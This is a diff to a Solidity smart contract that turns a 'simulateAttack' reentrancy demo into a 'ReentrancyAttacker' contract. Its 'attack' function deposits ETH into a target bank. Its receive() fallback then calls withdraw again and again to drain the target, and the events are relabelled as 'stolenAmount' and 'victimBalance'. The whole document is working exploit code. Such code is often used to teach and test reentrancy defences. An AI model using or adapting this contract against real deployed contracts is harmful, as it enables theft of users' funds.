@@ -6,41 +6,32 @@ interface IBank {
     function withdraw() external;
 }
 
-contract reentrancy{
+contract ReentrancyAttacker {
     IBank public target;
-
     uint256 public reentryCount;
-    uint256 public maxReentries = 10;
     bool public attackInProgress;
 
     event AttackStarted(uint256 amount);
-    event Reentered(uint256 count, uint256 contractBalance);
-    event AttackFinished(uint256 finalBalance);
+    event Reentered(uint256 count, uint256 victimBalance);
+    event AttackFinished(uint256 stolenAmount);
 
     constructor(address _target) {
         target = IBank(_target);
     }
 
-    function setMaxReentries(uint256 _max) external {
-        maxReentries = _max;
-    }
-
-    function simulateAttack() external payable {
+    function attack() external payable {
         require(msg.value > 0, "Send ETH");
-
+        reentryCount = 0;
         attackInProgress = true;
         emit AttackStarted(msg.value);
-
         target.deposit{value: msg.value}();
         target.withdraw();
-
         attackInProgress = false;
-
         emit AttackFinished(address(this).balance);
     }
 
     receive() external payable {
-        if (attackInProgress && reentryCount < maxReentries) {
+        if (attackInProgress && reentryCount < 10) {
             reentryCount++;
             emit Reentered(reentryCount, address(target).balance);
             target.withdraw();
